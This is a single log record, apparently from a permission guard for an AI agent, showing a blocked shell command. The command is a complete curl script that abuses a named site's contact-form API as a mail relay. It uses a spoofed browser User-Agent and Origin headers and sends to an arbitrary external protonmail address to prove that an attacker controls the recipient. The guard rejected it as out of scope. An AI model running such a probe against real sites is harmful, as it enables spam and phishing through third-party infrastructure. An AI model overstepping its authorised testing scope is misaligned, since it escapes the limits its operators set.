{"ts": 1790737511.6803596, "decision_id": "2c2bb718164f", "tool": "run_shell", "allow": false, "reason": "out-of-scope target blocked: protonmail.com", "target": "mkdir -p /work/evidence; cd /work/evidence\nUA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36'\nsend() {\n  local label=\"$1\" targets=\"$2\" out\n  out=$(mktemp)\n  code=$(curl -s -m 45 -o \"$out\" -D /tmp/ev.hdr -w \"%{http_code}\" -X POST 'https://www.infinitycapital.bh/api/send' \\\n    -H \"User-Agent: $UA\" -H 'Origin: https://www.infinitycapital.bh' -H 'Referer: https://www.infinitycapital.bh/contact' \\\n    -F 'fname=Verifier' -F 'lname=Independent' -F 'areacode=+973' -F 'tel=0000000' \\\n    -F 'cname=Audit' -F 'subject=authorized security test' \\\n    -F 'msg=Authorized security assessment of contact form mail relay. Disregard.' \\\n    -F 'check=' -F \"targets=$targets\")\n  echo \"### $label  targets=[$targets]\"\n  echo \"HTTP: $code\"\n  echo \"BODY: $(head -c 500 \"$out\")\"\n  echo \"HDRS: $(grep -iE 'x-vercel|ratelimit|retry-after|x-matched-path|^server|^content-type' /tmp/ev.hdr | tr -d '\\r' | tr '\\n' ' ')\"\n  echo\n  rm -f \"$out\"\n}\n# A: use the site's OWN address (normal case)\nsend \"A-ownrecipient\" \"contact@infinitycapital.bh\" | tee A_own.txt\n# B: same request, different (arbitrary) recipient -> proves attacker controls To:\nsend \"B-arbitrary-recipient\" \"audit-relay-test@protonmail.com\" | tee B_arbitrary.txt"}
